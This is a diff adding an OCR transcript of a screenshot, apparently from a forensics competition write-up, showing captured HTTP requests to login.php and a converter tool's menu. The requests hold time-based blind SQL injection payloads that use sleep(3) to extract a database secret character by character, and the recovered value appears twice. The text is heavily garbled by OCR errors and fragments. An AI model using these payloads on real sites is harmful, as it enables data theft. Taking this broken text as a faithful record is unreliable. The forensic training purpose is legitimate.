@@ -1,0 +1,55 @@
+# OCR: 2acda039ef60ca8a178fbdabb2680a26.webp
+# 来源: ./02-WriteUp/2024/2024-数证杯-决赛个人赛/2acda039ef60ca8a178fbdabb2680a26.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:11
+
+139 1 1 139 1 139 1 139 1 139 1 139 1 139 1 139 1 139
+ot 5
+Fo
+文件
+192.168.22.1 192.168.22.139 192.168.22.139 192.168.22.1 192.168.22.139 192.168.22.1
+Th!s_1s_5ecret!
+编辑
+查看
+Th!s 1s 5ecret!
+HTTP HTTP HTTP HTTP HTTP HTTP
++
+1229HI1P/1.1
+2000K
+(text/html
+362GET/login.php/?name=lucy'%20and%20if((ascii(substr((%20select%20secret%20from%20secret.secret%20limit%200,1),15,1)))%3E32,sleep(3),0)%23&su.. 362GET/login.php/?name=lucy*%20and%20if((ascii(substr((%20select%20secret%20from%20secret.secret%20limit%200,1),16,1)))%3E79,sleep(3),0)%23&su... 1229HTTP/1.12000K（text/html）
+362GET/login.php/?name=lucy'%20and%20if((ascii(substr((%20select%20secret%20from%20secret.secret%20limit%200,1),16,1)))%3E55,sleep(3),0)%23&su. 1229HTTP/1.12000K（text/html）
+口
+朗
+Ctool
+oCtool
+常用
+JSONT具
+Http请求代码
+加解密/签名
+汉字转拼音
+颜色
+校验
+进制转换
+OUrl解析
+编解码序列化
+转换单位换算
+生成
+? 其他
+?
+搜索工具
+时间日期
+OASCII
+变量名
+OHex/String
+x 口
+Q
+secret%201imit%200,1),16,1)))%3E43,sleep(3),0)%23&su.. secret%201imit%200,1),16,1)))%3E37,sleep(3),0)%23&su.. X
+et%201imit%200,1),16,1)))%3E34,sleep(3),0)%23&su..
+oo n
+OARM/HEX
+参考
+字符串
+et%201imit%200,1),16,1)))%3E33,s1eep(3).0)%23&su.. et%201imit%200,1),16,1)))%3E32,sleep(3),0)%23&su..
+E
